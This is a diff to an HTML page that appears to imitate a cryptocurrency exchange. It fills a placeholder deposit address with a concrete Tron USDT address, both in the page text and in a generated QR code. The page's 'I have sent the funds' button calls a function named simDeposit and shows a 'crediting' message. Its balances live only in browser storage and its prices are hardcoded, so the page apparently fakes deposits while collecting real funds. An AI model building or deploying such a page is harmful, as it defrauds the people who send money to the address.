@@ -62,8 +62,8 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
   <div class="bal"><small>Available</small><b id="bal2">0.00 USDT</b></div>
   <h2>Deposit USDT</h2>
   <p class="sub">Network: TRC20 (Tron)</p>
-  <div class="addr" id="addr">ADDRHERE</div>
-  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=ADDRHERE">
+  <div class="addr" id="addr">TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ">
   <button onclick="copyAddr()">Copy address</button>
   <button class="ghost" style="margin-top:8px" onclick="simDeposit()">I have sent the funds</button>
   <div class="ok" id="dok">Deposit detected — crediting…</div>
@@ -85,7 +85,7 @@ h3{font-size:13px;color:#848e9c;margin:18px 0 8px;text-transform:uppercase;lette
 </nav>
 
 <script>
-var ADDR="ADDRHERE";
+var ADDR="TEumYZdskXkaEvJsSFvCQmoW94XAZ6pMLQ";
 var S=JSON.parse(localStorage.getItem("bnc")||'{"bal":0,"h":{},"p":{}}');
 if(!S.p.BTC){S.p={BTC:96400,ETH:3410,SOL:198,BNB:612,XRP:2.31};save();}
 var cur="BTC",hist={};
